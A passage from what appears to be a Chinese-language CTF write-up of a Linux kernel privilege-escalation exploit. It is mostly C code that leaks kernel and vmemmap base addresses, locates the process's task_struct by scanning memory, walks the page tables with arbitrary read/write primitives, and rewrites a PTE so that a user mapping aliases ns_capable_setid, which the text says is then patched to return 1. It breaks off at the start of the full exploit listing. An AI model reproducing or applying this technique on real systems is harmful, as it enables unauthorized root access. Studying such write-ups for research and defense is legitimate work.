</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">tmp_idx</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span><span class="c1">//idx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">tmp_idx</span> <span class="o">=</span> <span class="n">tmp_idx</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;tmp_idx:%d&#34;</span><span class="p">,</span><span class="n">tmp_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1246ec0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;kernel_base:0x%llx&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">vmemmap_base</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfffffffff0000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;vmemmap_base:%llx&#34;</span><span class="p">,</span><span class="n">vmemmap_base</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol start="8">
<li>接下来我们来获取线性映射区的地址（page_offset_base）堆栈地址也属于线性映射区的地址, 我们可以利用 task_struct 来获取线性映射区的地址</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_NAME</span><span class="p">,</span><span class="s">&#34;cnitlrt&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">find_addr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">find_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">cred_addr</span><span class="p">,</span><span class="n">task_struct_addr</span><span class="p">,</span><span class="n">mm_struct_addr</span><span class="p">,</span><span class="n">comm_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">arb_read</span><span class="p">(</span><span class="n">vmemmap_base</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">*</span> <span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">find_addr</span> <span class="o">=</span> <span class="nf">memmem</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="s">&#34;cnitlrt&#34;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">find_data</span> <span class="o">=</span> <span class="n">find_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">find_addr</span> <span class="o">&amp;&amp;</span> <span class="nf">is_heap_pointer</span><span class="p">(</span><span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//cred_addr page_offset_base
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">page_offset_base</span> <span class="o">=</span> <span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xfffffffff0000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//mm_sturct_addr 的地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">mm_struct_addr</span> <span class="o">=</span> <span class="n">find_data</span><span class="p">[</span><span class="o">-</span><span class="mh">0x4e</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//page_offset_base + 0x1000*i 获取 task_struct 所在的页
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">comm_addr</span> <span class="o">=</span> <span class="n">find_addr</span> <span class="o">-</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mh">0x1000</span> <span class="o">+</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;page_offset_base: 0x%llx&#34;</span><span class="p">,</span><span class="n">page_offset_base</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;comm_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">comm_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;mm_struct_addr: 0x%llx&#34;</span><span class="p">,</span><span class="n">mm_struct_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="页表解析-1">页表解析</h5>
<p>Q: 暂时不知道为什么解析到 pte_addr 之后获取到的就是 kerenel_base 对应的页表了</p>
<p>按理来说通过读取 pte 可以获取到 page 的地址，然后加上最后的偏移即可获取到所对应的物理地址</p>
<h6 id="首先获取-ns_capable_setid-的物理地址">首先获取 ns_capable_setid 的物理地址</h6>
<p>pgd-&gt; pud-&gt; pmd-&gt; pte</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">mmap_addr</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="mh">0x114514000</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">mmap_addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">pgd_addr</span><span class="p">,</span><span class="n">pte_addr</span><span class="p">,</span><span class="n">pud_addr</span><span class="p">,</span><span class="n">pmd_addr</span><span class="p">,</span><span class="n">page_addr</span><span class="p">,</span><span class="n">dst_addr</span><span class="p">,</span><span class="n">phy_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">mmap_addr</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">mm_struct_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pgd_addr</span> <span class="o">=</span> <span class="n">data</span><span class="p">[((</span><span class="n">mm_struct_addr</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">dst_addr</span> <span class="o">=</span> <span class="mh">0xeab50</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">;</span><span class="c1">// ns_capable_setid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pgd_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PGD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pud_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PUD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">phy_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span><span class="c1">//ns_capable_setid 的物理地址
</span></span></span></code></pre></td></tr></table>
</div>
</div><h6 id="获取-mmap-的物理地址并修改其指向-ns_capable_setid-的物理地址">获取 mmap 的物理地址，并修改其指向 ns_capable_setid 的物理地址</h6>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="n">dst_addr</span> <span class="o">=</span> <span class="n">mmap_addr</span><span class="p">;</span><span class="c1">// ns_capable_setid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pgd_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PGD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pud_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PUD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span><span class="c1">//== kernel_base ;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">=</span> <span class="n">phy_addr</span> <span class="o">|</span> <span class="mh">0x8000000000000867</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_write</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span><span class="n">data</span><span class="p">,</span><span class="mh">0xff0</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>之后便可以直接通过mmap来修改ns_capable_setid地址中的内容
直接让其返回为1即可</p>
<p>修改之前</p>
<p>pte-&gt; mmap_addr
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003026-708.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003026-708.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003026-708.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003026-708.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003026-708.png"
        title="image-20240204052633271" />
修改之后</p>
<p>pte-&gt; mmap_page_addr</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003020-844.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003020-844.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003020-844.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003020-844.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003020-844.png"
        title="image-20240204052341233" /></p>
<p>物理地址<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003015-467.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003015-467.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003015-467.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003015-467.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240218003015-467.png"
        title="image-20240204052521824" /></p>
<h4 id="完整-exp">完整 exp</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;banzi.h&#34;</span><span class="cp">
